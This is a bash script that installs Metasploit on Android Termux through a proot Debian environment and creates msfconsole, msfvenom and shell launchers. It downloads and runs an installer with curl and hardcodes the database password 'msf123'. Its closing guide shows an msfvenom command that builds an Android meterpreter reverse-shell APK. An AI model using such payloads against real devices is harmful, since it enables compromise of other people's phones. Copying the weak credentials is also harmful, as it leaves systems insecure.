#!/data/data/com.termux/files/usr/bin/bash

################################################################
# Script Name : Metasploit Proot Installer (Debian)
# Author      : Raj Aryan (h4ck3r0)
# GitHub      : https://github.com/h4ck3r0/Metasploit-termux
# YouTube     : Youtube.com/c/H4Ck3R0
# Website     : https://h4ck3r.me
#
# Approach    : proot-distro + Debian (lightweight ~300MB)
#               Uses Rapid7 official omnibus installer
#               Zero Ruby gem compilation - always works!
################################################################

PREFIX="/data/data/com.termux/files/usr"
LOG_FILE="$HOME/proot_install.log"
DISTRO="debian"

# Storage path — termux-setup-storage creates ~/storage/shared → /sdcard
# Prefer the Termux symlink path; fall back to raw /sdcard
if [ -d "$HOME/storage/shared" ]; then
    SDCARD="$HOME/storage/shared"
else
    SDCARD="/sdcard"
fi

MSF_DIR="$SDCARD/MSF"

RED="\e[31m"
GREEN="\e[32m"
BLUE="\e[34m"
YELLOW="\e[33m"
CYAN="\e[36m"
BOLD="\e[1m"
RESET="\e[0m"

banner() {
    clear
    echo -e "${RED}"
    echo -e " ███████╗███████╗████████╗██╗   ██╗██████╗ "
    echo -e " ██╔════╝██╔════╝╚══██╔══╝██║   ██║██╔══██╗"
    echo -e " ███████╗█████╗     ██║   ██║   ██║██████╔╝"
    echo -e " ╚════██║██╔══╝     ██║   ██║   ██║██╔═══╝ "
    echo -e " ███████║███████╗   ██║   ╚██████╔╝██║     "
    echo -e " ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝     "
    echo -e "${BLUE}  ╔═══════════════════════════════════════╗${RESET}"
    echo -e "${BLUE}  ║  ${YELLOW}Proot-Distro Installer (Debian)${BLUE}      ║${RESET}"
    echo -e "${BLUE}  ║  ${CYAN}Author  : Raj Aryan (h4ck3r0)${BLUE}        ║${RESET}"
    echo -e "${BLUE}  ║  ${CYAN}Method  : Rapid7 Official Omnibus${BLUE}    ║${RESET}"
    echo -e "${BLUE}  ║  ${CYAN}Distro  : Debian (Lightweight ~300MB)${BLUE}║${RESET}"
    echo -e "${BLUE}  ╚═══════════════════════════════════════╝${RESET}"
    echo -e "${CYAN}  Logs saved to: ~/proot_install.log${RESET}\n"
}

run_task() {
    local msg="$1"
    local cmd="$2"
    local allow_fail="${3:-false}"  # pass "nofail" to not exit on error

    echo -ne "${YELLOW}[...]${RESET} $msg"
    eval "$cmd" >> "$LOG_FILE" 2>&1
    local status=$?

    if [ $status -eq 0 ]; then
        echo -e "\r${GREEN}[DONE]${RESET} $msg"
    else
        if [ "$allow_fail" = "nofail" ]; then
            echo -e "\r${YELLOW}[SKIP]${RESET} $msg (non-fatal, continuing)"
        else
            echo -e "\r${RED}[FAIL]${RESET} $msg"
            echo -e "${RED}       Check $LOG_FILE for details${RESET}"
            exit 1
        fi
    fi
}

# ─────────────────────────────────────────────
# STEP 1: Setup Termux storage access
# ─────────────────────────────────────────────
setup_storage() {
    echo -e "\n${BOLD}${CYAN}[STEP 1]${RESET} Setting up storage access...\n"

    if [ ! -d "$HOME/storage/shared" ] && [ ! -d "/sdcard" ]; then
        echo -e "${YELLOW}[!] Requesting storage permission...${RESET}"
        termux-setup-storage
        sleep 3
    fi

    # Re-detect after setup in case it just ran
    if [ -d "$HOME/storage/shared" ]; then
        SDCARD="$HOME/storage/shared"
    elif [ -d "/sdcard" ]; then
        SDCARD="/sdcard"
    else
        echo -e "${RED}[!] Storage not accessible. Grant permission manually and re-run.${RESET}"
        exit 1
    fi

    MSF_DIR="$SDCARD/MSF"

    # Create MSF folder structure
    mkdir -p "$MSF_DIR/payloads" "$MSF_DIR/loot" "$MSF_DIR/backups" 2>/dev/null
    echo -e "${GREEN}[DONE]${RESET} Storage ready"
    echo -e "        Path    : ${CYAN}$SDCARD${RESET}"
    echo -e "        MSF dir : ${CYAN}$MSF_DIR${RESET}\n"
}

# ─────────────────────────────────────────────
# STEP 2: Install proot-distro in Termux
# ─────────────────────────────────────────────
install_proot() {
    echo -e "${BOLD}${CYAN}[STEP 2]${RESET} Installing proot-distro...\n"

    run_task "Updating Termux packages" "pkg update -y && pkg upgrade -y"
    run_task "Installing proot-distro" "pkg install -y proot-distro wget curl"
}

# ─────────────────────────────────────────────
# STEP 3: Install Debian proot environment
# ─────────────────────────────────────────────
install_debian() {
    echo -e "\n${BOLD}${CYAN}[STEP 3]${RESET} Installing Debian (lightweight)...\n"

    # proot-distro 5.x stores rootfs at $PREFIX/var/lib/proot-distro/installed-rootfs/
    # Older versions used $HOME/proot-distro/installed-rootfs/
    # Check both paths, then fallback to a login test
    local ROOTFS_NEW="$PREFIX/var/lib/proot-distro/installed-rootfs/$DISTRO"
    local ROOTFS_OLD="$HOME/proot-distro/installed-rootfs/$DISTRO"

    if [ -f "$ROOTFS_NEW/etc/debian_version" ] || [ -f "$ROOTFS_OLD/etc/debian_version" ]; then
        echo -e "${GREEN}[DONE]${RESET} Debian already installed, skipping download"
    elif proot-distro login "$DISTRO" -- true 2>/dev/null; then
        echo -e "${GREEN}[DONE]${RESET} Debian already installed (verified via login test)"
    else
        run_task "Downloading & installing Debian (~300MB)" \
            "proot-distro install $DISTRO"
    fi
}

# ─────────────────────────────────────────────
# STEP 4: Bootstrap Debian (deps + MSF)
# ─────────────────────────────────────────────
setup_debian() {
    echo -e "\n${BOLD}${CYAN}[STEP 4]${RESET} Bootstrapping Debian environment...\n"

    # Build the Debian setup script
    local SETUP_SCRIPT=$(cat << 'DEBIAN_EOF'
#!/bin/bash
set -e

echo "[*] Updating Debian package lists..."
apt-get update -y

echo "[*] Installing core dependencies..."
apt-get install -y --no-install-recommends \
    curl wget gnupg2 lsb-release \
    postgresql postgresql-contrib \
    ca-certificates \
    libpcap-dev libpq-dev \
    iputils-ping nmap net-tools \
    ruby ruby-dev build-essential

echo "[*] Downloading Rapid7 official MSF installer..."
curl -s https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \
    > /tmp/msfinstall

chmod +x /tmp/msfinstall

echo "[*] Running Rapid7 official installer (pre-built - no gem compilation)..."
/tmp/msfinstall

echo "[*] Setting up PostgreSQL for Metasploit..."
service postgresql start || pg_ctlcluster 15 main start || true
sleep 2

# Create msf user and database
su postgres -c "psql -c \"CREATE USER msf WITH PASSWORD 'msf123';\"" 2>/dev/null || true
su postgres -c "psql -c \"CREATE DATABASE msf OWNER msf;\"" 2>/dev/null || true
su postgres -c "psql -c \"GRANT ALL PRIVILEGES ON DATABASE msf TO msf;\"" 2>/dev/null || true

echo "[*] Creating Metasploit database config..."
mkdir -p /root/.msf4
cat > /root/.msf4/database.yml << 'DB_EOF'
production:
  adapter: postgresql
  database: msf
  username: msf
  password: msf123
  host: 127.0.0.1
  port: 5432
  pool: 5
  timeout: 5
DB_EOF

echo "[+] Debian setup complete!"
DEBIAN_EOF
)

    # Write setup script to temp file accessible from proot
    echo "$SETUP_SCRIPT" > "$HOME/debian_setup.sh"
    chmod +x "$HOME/debian_setup.sh"

    run_task "Installing dependencies inside Debian" \
        "proot-distro login $DISTRO --bind $HOME:/root/termux_home -- bash /root/termux_home/debian_setup.sh"

    rm -f "$HOME/debian_setup.sh"
}

# ─────────────────────────────────────────────
# STEP 5: Create launcher scripts
# ─────────────────────────────────────────────
create_launchers() {
    echo -e "\n${BOLD}${CYAN}[STEP 5]${RESET} Creating launcher scripts...\n"

    # ── msfconsole launcher ──────────────────
    cat > "$PREFIX/bin/msfconsole" << 'LAUNCHER_EOF'
#!/data/data/com.termux/files/usr/bin/bash
# Metasploit Console Launcher (proot-distro / Debian)
# Auto-initializes PostgreSQL cluster if needed, then launches msfconsole

DISTRO="debian"

echo -e "\e[36m[*] Starting Metasploit via Debian proot...\e[0m"
echo -e "\e[33m[*] Save payloads to /sdcard/MSF/payloads/\e[0m\n"

proot-distro login $DISTRO \
    --bind /sdcard/MSF:/root/msf-output \
    -- bash -c '
        # ── Detect installed PostgreSQL version ──────────────────────
        PG_VER=$(ls /etc/postgresql/ 2>/dev/null | sort -n | tail -1)

        if [ -z "$PG_VER" ]; then
            echo "[!] PostgreSQL not found inside Debian. Run: msf-shell → apt install postgresql"
        else
            # ── Create cluster if it does not exist ──────────────────
            CLUSTERS=$(pg_lsclusters 2>/dev/null | grep -v "^Ver" | wc -l)
            if [ "$CLUSTERS" -eq 0 ]; then
                echo "[*] No PostgreSQL cluster found — creating one..."
                pg_createcluster $PG_VER main --start 2>/dev/null \
                    && echo "[*] Cluster created and started." \
                    || echo "[!] Cluster creation failed — MSF will run without DB"
            else
                # ── Start existing cluster ────────────────────────────
                pg_ctlcluster $PG_VER main start 2>/dev/null || true
            fi

            # ── Create msf user + database on first run ───────────────
            sleep 1
            su postgres -c "psql -c \"CREATE USER msf WITH PASSWORD '"'"'msf123'"'"';\"" 2>/dev/null || true
            su postgres -c "psql -c \"CREATE DATABASE msf OWNER msf;\"" 2>/dev/null || true
            su postgres -c "psql -c \"GRANT ALL PRIVILEGES ON DATABASE msf TO msf;\"" 2>/dev/null || true

            # ── Write database.yml if missing ─────────────────────────
            if [ ! -f /root/.msf4/database.yml ]; then
                mkdir -p /root/.msf4
                cat > /root/.msf4/database.yml << DB_EOF
production:
  adapter: postgresql
  database: msf
  username: msf
  password: msf123
  host: 127.0.0.1
  port: 5432
  pool: 5
  timeout: 5
DB_EOF
                echo "[*] Database config written."
            fi
        fi

        /opt/metasploit-framework/bin/msfconsole "$@"
    ' -- "$@"
LAUNCHER_EOF

    # ── msfvenom launcher ────────────────────
    cat > "$PREFIX/bin/msfvenom" << 'VENOM_EOF'
#!/data/data/com.termux/files/usr/bin/bash
# Metasploit Venom Launcher (proot-distro / Debian)
# /sdcard is auto-mounted by proot-distro
# Usage: msfvenom -p <payload> LHOST=<ip> LPORT=<port> -o /sdcard/MSF/payloads/output.apk

DISTRO="debian"

# If -o flag not given, show hint
if [[ "$*" != *"-o"* ]] && [[ "$*" != *"--out"* ]]; then
    echo -e "\e[33m[TIP] No output file specified. Save to phone: -o /sdcard/MSF/payloads/payload.apk\e[0m"
fi

# Pass args directly to msfvenom — no bash -c wrapper to avoid quoting issues
exec proot-distro login $DISTRO \
    -- /opt/metasploit-framework/bin/msfvenom "$@"
VENOM_EOF

    # ── msf-shell: interactive Debian shell ──
    cat > "$PREFIX/bin/msf-shell" << SHELL_EOF
#!/data/data/com.termux/files/usr/bin/bash
# Drop into Debian proot shell with /sdcard auto-mounted
# Use this to build tools, copy files, etc.
# /sdcard is available inside — copy files: cp /root/file.apk /sdcard/MSF/

DISTRO="debian"
echo -e "\e[36m[*] Entering Debian shell (proot)\e[0m"
echo -e "\e[33m[*] /sdcard is auto-mounted — cp /root/file /sdcard/MSF/\e[0m\n"

proot-distro login \$DISTRO \
    --bind /sdcard/MSF:/root/msf-output
SHELL_EOF

    chmod +x "$PREFIX/bin/msfconsole" \
              "$PREFIX/bin/msfvenom" \
              "$PREFIX/bin/msf-shell"

    run_task "Launcher scripts created" "true"
    echo -e "   ${CYAN}→ msfconsole${RESET}  Launch Metasploit console"
    echo -e "   ${CYAN}→ msfvenom${RESET}    Generate payloads"
    echo -e "   ${CYAN}→ msf-shell${RESET}   Enter Debian environment"
}

# ─────────────────────────────────────────────
# STEP 6: Print storage guide
# ─────────────────────────────────────────────
storage_guide() {
    echo -e "\n${BLUE}══════════════════════════════════════════${RESET}"
    echo -e "${BOLD}${GREEN}  📁 Storage & File Access Guide${RESET}"
    echo -e "${BLUE}══════════════════════════════════════════${RESET}"
    echo -e ""
    echo -e "  ${YELLOW}Inside Debian proot, you can access:${RESET}"
    echo -e "  ${CYAN}/sdcard/${RESET}              → Phone internal storage"
    echo -e "  ${CYAN}/sdcard/MSF/payloads/${RESET} → Save payloads here"
    echo -e "  ${CYAN}/sdcard/MSF/loot/${RESET}     → Save loot/data here"
    echo -e "  ${CYAN}/root/msf-output/${RESET}     → Alias to /sdcard/MSF"
    echo -e ""
    echo -e "  ${YELLOW}Example — generate APK payload to phone:${RESET}"
    echo -e "  ${GREEN}msfvenom -p android/meterpreter/reverse_tcp \\"
    echo -e "    LHOST=192.168.1.100 LPORT=4444 \\"
    echo -e "    -o /sdcard/MSF/payloads/payload.apk${RESET}"
    echo -e ""
    echo -e "  ${YELLOW}Build something inside Debian & copy to phone:${RESET}"
    echo -e "  ${GREEN}msf-shell${RESET}   (enter Debian)"
    echo -e "  ${GREEN}# ... build your tool ...${RESET}"
    echo -e "  ${GREEN}cp /root/mytool /sdcard/MSF/mytool${RESET}"
    echo -e ""
    echo -e "  ${YELLOW}Access from Android file manager:${RESET}"
    echo -e "  ${CYAN}Internal Storage → MSF → payloads/${RESET}"
    echo -e "${BLUE}══════════════════════════════════════════${RESET}\n"
}

# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
banner
> "$LOG_FILE"

setup_storage
install_proot
install_debian
setup_debian
create_launchers
storage_guide

echo -e "${GREEN}${BOLD}✔ Installation complete!${RESET}"
echo -e "${CYAN}  Run: ${GREEN}msfconsole${RESET}   to start Metasploit"
echo -e "${CYAN}  Run: ${GREEN}msf-shell${RESET}    to enter Debian environment"
echo -e "${CYAN}  Run: ${GREEN}msfvenom${RESET}     to generate payloads\n"
